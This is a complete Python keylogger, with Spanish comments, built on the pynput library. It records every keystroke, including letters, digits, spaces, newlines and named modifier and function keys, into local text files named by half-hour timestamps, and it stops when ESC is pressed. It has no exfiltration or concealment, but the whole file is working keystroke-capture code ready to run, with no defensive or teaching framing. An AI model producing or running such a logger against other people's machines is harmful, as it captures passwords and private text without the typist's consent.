from pynput import keyboard
from datetime import datetime

def on_press(key):
    try:
        # Genera el nombre del archivo con fecha y hora redondeada a media hora
        now = datetime.now()
        if now.minute >= 30:
            half_hour = now.replace(minute=30, second=0, microsecond=0)
        else:
            half_hour = now.replace(minute=0, second=0, microsecond=0)
        timestamp = half_hour.strftime("%Y%m%d_%H%M")
        filename = f"registro_{timestamp}.txt"

        # Si es una tecla alfanumérica (letra o número)
        if hasattr(key, 'char') and key.char is not None:
            with open(filename, "a", encoding="utf-8") as f:
                f.write(key.char)
        else:
            # Manejo de teclas especiales
            if key == keyboard.Key.space:
                with open(filename, "a", encoding="utf-8") as f:
                    f.write(" ")  # Espacio literal
            elif key == keyboard.Key.enter:
                with open(filename, "a", encoding="utf-8") as f:
                    f.write("\n")  # Salto de línea
            else:
                # Lista de teclas especiales permitidas
                teclas_permitidas = {
                    keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
                    keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                    keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
                    keyboard.Key.tab, keyboard.Key.caps_lock, keyboard.Key.esc,
                    keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
                    keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4,
                    keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8,
                    keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12
                }
                if key in teclas_permitidas:
                    with open(filename, "a", encoding="utf-8") as f:
                        f.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:  # Presionar ESC para salir
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()